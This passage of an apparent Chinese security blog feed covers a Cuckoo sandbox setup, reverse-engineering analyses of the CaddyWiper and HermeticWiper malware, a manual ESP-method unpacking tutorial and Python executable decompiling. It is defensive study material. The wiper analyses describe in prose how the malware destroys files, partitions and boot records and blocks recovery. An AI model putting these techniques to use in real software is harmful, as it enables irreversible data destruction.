class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[virtualbox]<br><span class="hljs-comment"># Specify which VirtualBox mode you want to run your machines on.</span><br><span class="hljs-comment"># Can be &quot;gui&quot; or &quot;headless&quot;. Please refer to VirtualBox&#x27;s official</span><br><span class="hljs-comment"># documentation to understand the differences.</span><br>mode = headless<br><br><span class="hljs-comment"># Path to the local installation of the VBoxManage utility.</span><br>path = /usr/bin/VBoxManage<br><span class="hljs-comment"># If you are running Cuckoo on Mac OS X you have to change the path as follows:</span><br><span class="hljs-comment"># path = /Applications/VirtualBox.app/Contents/MacOS/VBoxManage</span><br><br><span class="hljs-comment"># Default network interface.</span><br>interface = vboxnet0   <span class="hljs-comment">#//网卡名称</span><br><br><span class="hljs-comment"># Specify a comma-separated list of available machines to be used. For each</span><br><span class="hljs-comment"># specified ID you have to define a dedicated section containing the details</span><br><span class="hljs-comment"># on the respective machine. (E.g. cuckoo1,cuckoo2,cuckoo3)</span><br>machines = win7     <span class="hljs-comment">#//guest虚拟机机名称</span><br><br><span class="hljs-comment"># If remote control is enabled in cuckoo.conf, specify a port range to use.</span><br><span class="hljs-comment"># Virtualbox will bind the VRDP interface to the first available port.</span><br>controlports = 5000-5050<br><br><br>[win7]<br><span class="hljs-comment"># Specify the label name of the current machine as specified in your</span><br><span class="hljs-comment"># VirtualBox configuration.</span><br>label = win7    <br><br><span class="hljs-comment"># Specify the operating system platform used by current machine</span><br><span class="hljs-comment"># [windows/darwin/linux].</span><br>platform = windows  <br><br><span class="hljs-comment"># Specify the IP address of the current virtual machine. Make sure that the</span><br><span class="hljs-comment"># IP address is valid and that the host machine is able to reach it. If not,</span><br><span class="hljs-comment"># the analysis will fail.</span><br>ip = 192.168.56.101   <span class="hljs-comment">#//guest IP</span><br><br><span class="hljs-comment"># (Optional) Specify the snapshot name to use. If you do not specify a snapshot</span><br><span class="hljs-comment"># name, the VirtualBox MachineManager will use the current snapshot.</span><br><span class="hljs-comment"># Example (Snapshot1 is the snapshot name):</span><br>snapshot = Snapshot 1    <span class="hljs-comment">#//快照名</span><br><br><span class="hljs-comment"># (Optional) Specify the name of the network interface that should be used</span><br><span class="hljs-comment"># when dumping network traffic from this machine with tcpdump. If specified,</span><br><span class="hljs-comment"># overrides the default interface specified in auxiliary.conf</span><br><span class="hljs-comment"># Example (vboxnet0 is the interface name):</span><br>interface = vboxnet0<br><br><span class="hljs-comment"># (Optional) Specify the IP of the Result Server, as your virtual machine sees it.</span><br><span class="hljs-comment"># The Result Server will always bind to the address and port specified in cuckoo.conf,</span><br><span class="hljs-comment"># however you could set up your virtual network to use NAT/PAT, so you can specify here</span><br><span class="hljs-comment"># the IP address for the Result Server as your machine sees it. If you don&#x27;t specify an</span><br><span class="hljs-comment"># address here, the machine will use the default value from cuckoo.conf.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> if you set this option you have to set result server IP to 0.0.0.0 in cuckoo.conf.</span><br><span class="hljs-comment"># Example:</span><br>resultserver_ip = <br><br><span class="hljs-comment"># (Optional) Specify the port for the Result Server, as your virtual machine sees it.</span><br><span class="hljs-comment"># The Result Server will always bind to the address and port specified in cuckoo.conf,</span><br><span class="hljs-comment"># however you could set up your virtual network to use NAT/PAT, so you can specify here</span><br><span class="hljs-comment"># the port for the Result Server as your machine sees it. If you don&#x27;t specify a port</span><br><span class="hljs-comment"># here, the machine will use the default value from cuckoo.conf.</span><br><span class="hljs-comment"># Example:</span><br>resultserver_port = <br><br><span class="hljs-comment"># (Optional) Set your own tags. These are comma separated and help to identify</span><br><span class="hljs-comment"># specific VMs. You can run samples on VMs with tag you require.</span><br>tags = <br><br><span class="hljs-comment"># Mostly unused for now. Please don&#x27;t fill it out.</span><br>options = <br><br><span class="hljs-comment"># (Optional) Specify the OS profile to be used by volatility for this</span><br><span class="hljs-comment"># virtual machine. This will override the guest_profile variable in</span><br><span class="hljs-comment"># memory.conf which solves the problem of having multiple types of VMs</span><br><span class="hljs-comment"># and properly determining which profile to use.</span><br>osprofile = <br><br><br>[honeyd]<br><span class="hljs-comment"># For more information on this VM please refer to the &quot;services&quot; section of</span><br><span class="hljs-comment"># the conf/auxiliary.conf configuration file. This machine is a bit special</span><br><span class="hljs-comment"># in the way that its used as an additional VM for an analysis.</span><br><span class="hljs-comment"># *NOTE* that if this functionality is used, the VM should be registered in</span><br><span class="hljs-comment"># the &quot;machines&quot; list in the beginning of this file.</span><br>label = honeyd<br>platform = linux<br>ip = 192.168.56.102<br><span class="hljs-comment"># The tags should at least contain &quot;service&quot; and the name of this service.</span><br><span class="hljs-comment"># This way the services auxiliary module knows how to find this particular VM.</span><br>tags = service, honeyd<br><span class="hljs-comment"># Not all services actually have a Cuckoo Agent running in the VM, for those</span><br><span class="hljs-comment"># services one can specify the &quot;noagent&quot; option so Cuckoo will just wait until</span><br><span class="hljs-comment"># the end of the analysis instead of trying to connect to the non-existing</span><br><span class="hljs-comment"># Cuckoo Agent. We can&#x27;t really intercept any inter-VM communication from the</span><br><span class="hljs-comment"># host / gateway so in order to dump traffic between VMs we have to use a</span><br><span class="hljs-comment"># different network dumping approach. For this machine we use the &quot;nictrace&quot;</span><br><span class="hljs-comment"># functionality from VirtualBox (which is basically their internal tcpdump)</span><br><span class="hljs-comment"># and thus properly dumps inter-VM traffic.</span><br>options = nictrace noagent<br></code></pre></td></tr></table></figure><h2 id="运行Cuckoo"><a href="#运行Cuckoo" class="headerlink" title="运行Cuckoo"></a>运行Cuckoo</h2><p>执行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cuckoo -d</span><br></code></pre></td></tr></table></figure><p>观察是否存在报错</p><p>没有报错执行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cuckoo</span> web runserver <span class="hljs-number">0.0.0.0:8000</span><br></code></pre></td></tr></table></figure><p>启动cuckoo web界面</p><p>访问127.0.0.0:8000</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419145034415.png" alt="image-20220419145034415"></p><p>上传一个文件，观察cuckoo -d控制台输出以及文件报告是否正常，存在异常进行排错</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419161131293.png" alt="image-20220419161131293"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>东西太老了对于新人各种坑，各种不适配</p><p>而且简单搭建的cuckoo其实作用不大，也就是一个简单的框架，还是需要二次开发的</p><p>在文件支持格式、反沙箱、反逃逸、多文件多guest并发等方面都需要厂商去完善</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cuckoo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CaddyWiper病毒分析</title>
    <link href="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>3月14日，研究人员在针对乌克兰组织的攻击中观察到新的数据擦除恶意软件CaddyWiper，这种恶意软件会从连接的驱动器中删除用户数据和分区信息，目前已在少数组织的几十个系统上观察到了该恶意软件。该恶意软件是通过组策略对象( GPO )部署的，这表明攻击者事先已经控制了目标的网络。这是自 2022 年初以来在乌克兰攻击中部署的第四种数据擦除恶意软件。对此次新出现的“CaddyWiper”恶意软件，基本信息如下：</p><table><thead><tr><th>文件名</th><th>CaddyWiper.exe</th></tr></thead><tbody><tr><td>MD5</td><td>42E52B8DAF63E6E26C3AA91E7E971492</td></tr><tr><td>SHA1</td><td>98B3FB74B3E8B3F9B05A82473551C5A77B576D54</td></tr><tr><td>CRC32</td><td>11A104D8</td></tr><tr><td>文件大小</td><td>9,216字节</td></tr><tr><td>病毒类型</td><td>HEUR:Trojan.Win32.Generic</td></tr></tbody></table><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p>获取样本基本信息，可以发现程序没有经过数字签名、未加壳，版本信息为VC++，2022年3月14日编译成功。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164220671.png" alt="image-20220414164220671"></p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164231056.png" alt="image-20220414164231056"></p><p>样本没有资源，没有图标，导入函数及字符串都极其简单。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164250657.png" alt="image-20220414164250657"></p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164304236.png" alt="image-20220414164304236"></p><h3 id="动态运行分析"><a href="#动态运行分析" class="headerlink" title="动态运行分析"></a>动态运行分析</h3><p>虚拟机运行样本后发现，样本会在运行后极短时间内引起系统蓝屏，自动重启后找不到系统，显示“Operating System not found”。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164447838.png" alt="image-20220414164447838"></p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164457760.png" alt="image-20220414164457760"></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>通过拼接字符串调用kernel32.dll。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164529634.png" alt="image-20220414164529634"></p><p>主函数首先通过首先执行“DsRoleGetPrimaryDomainInformation”获取域数据，以确定样本正在运行的系统的机器角色。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164547711.png" alt="image-20220414164547711"></p><p>如果域角色是等于5，即为“DsRole_RolePrimaryDomainController”域控制器，样本将终止并且不会继续执行任何破坏性功能。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164616417.png" alt="image-20220414164616417"></p><p>如果目标系统不是域控制器，样本开始递归擦除“C:&#x2F;&#x2F;Users”中的所有数据，包括隐藏文件和操作系统文件。如果文件大于 10 兆字节，擦除器只会破坏前 10 兆字节。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164631323.png" alt="image-20220414164631323"></p><p>如果文件当前被另一个进程锁定，样本首先尝试通过“SeTakeOwnershipPrivilege”获取文件的所有权，然后继续擦除文件。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164646211.png" alt="image-20220414164646211"></p><p>在“C:\Users”之后，对从“D:\ ”到“Z:\ ”的所有可用驱动器重复相同的过程。</p><p>当所有可用的驱动器都被擦除后，通过用 NULL 覆盖前 1920 个字节来擦除从“\.\PHYSICALDRIVE9”到“\.\PHYSICALDRIVE0”的磁盘分区。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164730916.png" alt="image-20220414164730916"></p><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><p><strong>MD5</strong>:</p><p>42E52B8DAF63E6E26C3AA91E7E971492</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CaddyWiper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HermeticWiper病毒分析</title>
    <link href="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>俄乌网络战中出现的四种数据擦除器：</p><table><thead><tr><th align="center"></th><th align="center">发现时间</th></tr></thead><tbody><tr><td align="center">WhisperGate</td><td align="center">2022年1月13日</td></tr><tr><td align="center"><em><strong>HermeticWiper</strong></em></td><td align="center"><em><strong>2022年2月24日</strong></em></td></tr><tr><td align="center">IsaacWiper</td><td align="center">2022年2月24日</td></tr><tr><td align="center">CaddyWiper</td><td align="center">2022年3月14日</td></tr></tbody></table><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>2022年2月24日，俄乌冲突逐渐升级。一款名为“ HermeticWiper”（又名KillDisk.NCV）的新型数据擦除恶意软件在乌克兰的数百台重要的计算机上被发现，涉及乌克兰的金融和政府承包商，导致相关组织的系统设备数据遭到摧毁，其中一次入侵涉及直接从Windows域控制器部署恶意软件。此次攻击还包括HermeticWizard（横向移动）、HermeticRansom（加密勒索）两个组件，但是样本质量不高，影响不大，真正构成威胁的仍是“HermeticWiper”。对于“HermeticWiper”恶意软件，详情如下：</p><table><thead><tr><th>文件名</th><th>HermeticWiper.exe</th></tr></thead><tbody><tr><td>MD5</td><td>3F4A16B29F2F0532B7CE3E7656799125</td></tr><tr><td>SHA1</td><td>61B25D11392172E587D8DA3045812A66C3385451</td></tr><tr><td>CRC32</td><td>4D4E5EAD</td></tr><tr><td>文件大小</td><td>117,000 字节</td></tr><tr><td>数字签名</td><td>Hermetica Digital Ltd</td></tr><tr><td>病毒类型</td><td>Trojan.Win32.HermeticWiper.a</td></tr></tbody></table><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p>样本使用了由“Hermetica Digital Ltd”进行的数字签名(证书目前已被吊销)，通过这种方式来逃避基于WindowsAPI的检测。</p><img src="image-20220414093929205.png" alt="image-20220414093929205" style="zoom: 80%;" /><p>获取样本基本信息，可以发现程序未加壳，版本信息为VC++7.10，由Visual Studio 2017编译，2022年2月23日编译成功。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094020626.png" alt="image-20220414094020626"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094031703.png" alt="image-20220414094031703"></p><p>样本包含了四个资源。通过SZDD头部信息可知均为微软自带的压缩格式，使用了微软的压缩命令工具“compress.exe”进行了压缩。使用expand命令解压后，通过文件签名和hash比对，发现这些驱动程序是商用数据恢复和磁盘管理软件“EaseUS Partition Master”的多个系统版本，包括x86和x64架构。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094100796.png" alt="image-20220414094100796"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094143835.png" alt="image-20220414094143835"></p><h3 id="动态运行分析"><a href="#动态运行分析" class="headerlink" title="动态运行分析"></a>动态运行分析</h3><p>虚拟机及沙箱运行样本后发现，样本会释放驱动程序，并进行安装，修改注册表，并大量枚举文件和目录，访问硬盘引导扇区，导致系统重启后显示“Missing operating system”。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094228752.png" alt="image-20220414094228752"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094238939.png" alt="image-20220414094238939"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094247118.png" alt="image-20220414094247118"></p><p>初步怀疑该样本通过利用驱动程序与存储设备进行交互，获取底层磁盘访问及检索分区信息的能力，进而修改硬盘存储的主引导记录、文件等信息，达到恶意擦除、摧毁数据的目的。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>首先样本会进行提权操作，为下一步枚举文件及目录做准备。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414110431872.png" alt="image-20220414110431872"></p><p>禁用卷影拷贝服务(vss)来禁用故障转储，破坏系统的备份。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094359696.png" alt="image-20220414094359696"></p><p>判断操作系统的版本和系统位数，根据结果加载四个资源文件中的其中一个资源文件。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094416604.png" alt="image-20220414094416604"></p><p>将注册表<em>HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled</em>键值设置为0，并获取所有物理磁盘的编号。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094441573.png" alt="image-20220414094441573"></p><p>将解压出的资源文件释放至*C:\Windows\System32\drivers*目录下并安装。安装成功后，与服务相关的注册表项以及删除的文件都将被删除，以使新驱动程序更难被发现。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094501429.png" alt="image-20220414094501429"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094508536.png" alt="image-20220414094508536"></p><p>最后进行数据删除。枚举0-100一系列物理驱动器，对于每个物理驱动器，.\PhysicalDrive%u都会调用设备以获取设备编号，并删除从0-100序号的所有物理驱动器中的C:\SystemVolume Information文件夹，防止系统通过还原点及备份恢复数据。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094528656.png" alt="image-20220414094528656"></p><p>对NTFS和FAT驱动器类型分别进行数据擦除处理。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094543758.png" alt="image-20220414094543758"></p><p>擦除<em>C:&#x2F;Documents and settings</em>文件夹中的内容，并销毁系统日志。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414105723656.png" alt="image-20220414105723656"></p><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><p><strong>MD5：</strong></p><p>3F4A16B29F2F0532B7CE3E7656799125</p><p>6106653B08F4F72EEAA7F099E7C408A4</p><p>093CEE3B45F0954DCE6CB891F6A920F7</p><p>BDF30ADB4E19AFF249E7DA26B7F33EAD</p><p>D57F1811D8258D8D277CD9F53657EEF9</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HermeticWiper 病毒利用合法驱动程序的数字签名，绕过某些Windows安全机制，同时利用驱动程序与存储设备进行交互，获取底层磁盘访问及检索分区信息的能力，进而对磁盘上的 MBR 和分区进行覆盖，使得数据几乎不可能恢复。并且该病毒对于隐匿痕迹以及阻止系统恢复的模块很有参考价值，增加了取证分析人员的工作难度。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.malwarebytes.com/threat-intelligence/2022/03/hermeticwiper-a-detailed-analysis-of-the-destructive-malware-that-targeted-ukraine/">https://blog.malwarebytes.com/threat-intelligence/2022/03/hermeticwiper-a-detailed-analysis-of-the-destructive-malware-that-targeted-ukraine/</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HermeticWiper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ESP定律手动脱壳</title>
    <link href="/2022/04/12/ESP%E5%AE%9A%E5%BE%8B%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2022/04/12/ESP%E5%AE%9A%E5%BE%8B%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h4 id="手工脱壳常用方法"><a href="#手工脱壳常用方法" class="headerlink" title="手工脱壳常用方法"></a>手工脱壳常用方法</h4><ol><li>单步跟踪法  </li><li>ESP定律法 </li><li>内存镜像法 </li><li>一步到达OEP </li><li>最后一次异常法</li><li>模拟跟踪法</li><li>“SFX”法</li></ol><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><ul><li><strong>PUSHAD</strong>（入栈&#x2F;压栈）：代表程序的入口点</li><li><strong>POPAD</strong>（弹栈&#x2F;出栈）：代表程序的出口点，与PUSHAD想对应，一般找到这个OEP就在附近</li><li><strong>OEP</strong>（Original Entry Point）：程序的入口点，软件加壳就是隐藏了OEP（或者用了假的OEP&#x2F;FOEP），只要我们找到程序真正的OEP，就可以立刻脱壳</li><li><strong>Dump</strong>：就是转存，在加壳程序中找到入口点，将内存中进程数据保存到硬盘里（普遍用的都是<em>LordPE</em>工具）</li><li><strong>IAT</strong>（Import Address Table ）：就是导入函数的地址表，这段地址存放的就是源程序的API函数地址（通常使用<em>ImportRce</em>修复脱壳时的地址表）</li></ul><h4 id="ESP定律脱壳"><a href="#ESP定律脱壳" class="headerlink" title="ESP定律脱壳"></a>ESP定律脱壳</h4><p><strong>ESP定律的原理</strong>：堆栈平衡原理。</p><p><strong>适用范围</strong>：几乎全部的压缩壳，部分加密壳。</p><p>​               载入程序单步运行(<em>F8</em>)后，只有ESP、EIP寄存器内容发生变化(<em>变红</em>)，那么这个程序大概率可以试用ESP定律。</p><p><strong>具体步骤</strong>：</p><p>Ollydbg打开target.exe，选择不分析代码。</p><p>F8单步执行一步，寄存器窗口只有ESP和EIP的值变红。</p><p>右键ESP，选择“<em>数据窗口中跟踪</em>”。</p><img src="image-20220412102857858.png" alt="image-20220412102857858" style="zoom: 67%;" /><p>在数据窗口，对ESP位置设置硬件断点。右键断点-硬件访问，任意一个类型。</p><img src="image-20220412103258956.png" alt="image-20220412103258956" style="zoom:50%;" /><p>然后F9一键运行程序，会停在popad指令，即恢复源程序环境指令附近。到这里也就说明它的壳环境执行完毕，OEP的位置也就不远了。然后选择调试-硬件断点，删除硬件断点。</p><img src="image-20220412105333517.png" alt="image-20220412105333517" style="zoom: 67%;" /><p>单步执行F8到了<em>jnz</em>位置后，点击它的下一行，然后F4让程序强制转到跳转下面继续运行，F8到达<em>jmp</em>后跳转到程序的OEP领空，确认OEP的位置。</p><img src="image-20220412110708313.png" alt="image-20220412110708313" style="zoom:50%;" /><p>然后，右击程序当前位置第一行代码，选择<em>用OllyDump脱壳调试进程</em>；</p><img src="image-20220412110153981.png" alt="image-20220412110153981" style="zoom:50%;" /><p>最后，我们在弹出的窗口中选择<em>脱壳</em>，然后，输入要另存为的文件名。该文件即为脱壳程序（没有重建IAT）。</p><img src="image-20220412110258393.png" alt="image-20220412110258393" style="zoom:50%;" /><p>如果没有OllyDump插件可以选择使用LordPE进行抓取内存数据。如下：</p><p>Ollydbg运行到OEP位置处，打开LordPE工具，选中脱壳程序target.exe右击<em>纠正镜像大小</em>（防止误读），再次右击选择<em>完全脱壳</em>，转存为dumped.exe。</p><p>然后修复输入表，打开ImportRCE工具，选择带壳程序进程target.exe，刚加载该程序进程的时候，它的OEP并不准确，将程序的实际OEP地址填进去，点击“<em>自动查找IAT</em>”，<em>获取输入表</em>，最后“<em>转储到文件</em>”选择dumped_.exe。</p><p>dumped_.exe即为脱壳程序。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://ctf-wiki.org/reverse/platform/windows/unpack/packer-introduction/">https://ctf-wiki.org/reverse/platform/windows/unpack/packer-introduction/</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python exe文件的编译与反编译</title>
    <link href="/2022/04/12/Python-exe%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <url>/2022/04/12/Python-exe%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h3 id="编译Python-代码"><a href="#编译Python-代码" class="headerlink" title="编译Python 代码"></a>编译Python 代码</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pyinstaller <br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">pyinstaller.<span class="hljs-keyword">exe</span> -F *编译的<span class="hljs-keyword">python</span>文件<span class="hljs-keyword">py</span>*<br></code></pre></td></tr></table></figure><h3 id="反编译Python-EXE"><a href="#反编译Python-EXE" class="headerlink" title="反编译Python EXE"></a>反编译Python EXE</h3><h4 id="下载pyinstxtractor"><a href="#下载pyinstxtractor" class="headerlink" title="下载pyinstxtractor"></a>下载pyinstxtractor</h4><p><a href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></p><h4 id="使用pyinstxtractor"><a href="#使用pyinstxtractor" class="headerlink" title="使用pyinstxtractor"></a>使用pyinstxtractor</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> pyinstxtractor.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;filename&gt;</span><br></code></pre></td></tr></table></figure><h4 id="找到相应的pyc文件"><a href="#找到相应的pyc文件" class="headerlink" title="找到相应的pyc文件"></a>找到相应的pyc文件</h4><p>运行后生成xx.exe_extracted文件夹，找到相应的pyc文件（文件夹内的PYZ-00.pyz_extracted文件夹是引入的依赖库）</p><h4 id="反编译pyc文件"><a href="#反编译pyc文件" class="headerlink" title="反编译pyc文件"></a><strong>反编译pyc文件</strong></h4><p>在线反编译 <a href="http://tools.bugscaner.com/decompyle/">http://tools.bugscaner.com/decompyle/</a></p><p>uncompyle6  <a href="https://github.com/rocky/python-uncompyle6/">https://github.com/rocky/python-uncompyle6/</a></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> uncompyle6<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">uncompyle6 -o . <span class="hljs-emphasis">*编译的python文件pyc或pyo *</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>驱动人生木马分析</title>
    <link href="/2022/04/11/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
